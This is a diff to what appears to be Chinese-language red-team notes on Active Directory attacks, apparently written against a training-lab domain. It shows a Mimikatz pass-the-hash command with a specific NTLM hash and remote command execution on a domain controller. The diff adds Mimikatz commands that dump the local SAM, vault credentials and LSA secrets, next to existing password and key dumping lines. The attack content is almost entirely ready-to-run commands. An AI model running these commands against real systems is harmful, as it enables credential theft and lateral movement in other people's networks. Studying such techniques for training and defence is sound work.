@@ -52,7 +52,6 @@ lsadump::sam
 Invoke-Mimikatz -Command '"sekurlsa::pth /user:svcadmin /domain:dollarcorp.moneycorp.local /ntlm:b38ff50264b74508085d82c69794a4d8 /run:powershell.exe"'
 ```
 
-
 # 执行命令
 ```
 Invoke-Command -ScriptBlock {whoami;hostname} -ComputerName dcorp-dc.dollarcorp.moneycorp.local
@@ -67,11 +66,20 @@ Invoke-Command -ScriptBlock {whoami;hostname} -ComputerName dcorp-dc.dollarcorp.
 #提升权限
 privilege::debug
 
+# 本地sam文件
+lsadump::sam
+
 #抓取密码
 sekurlsa::logonpasswords
 
 # ekeys
 sekurlsa::ekeys
+
+# vault凭据
+vault::cred /patch
+
+# 转存lsa的secrets
+lsadump::secrets
 ```
 
 # 禁用LSA保护
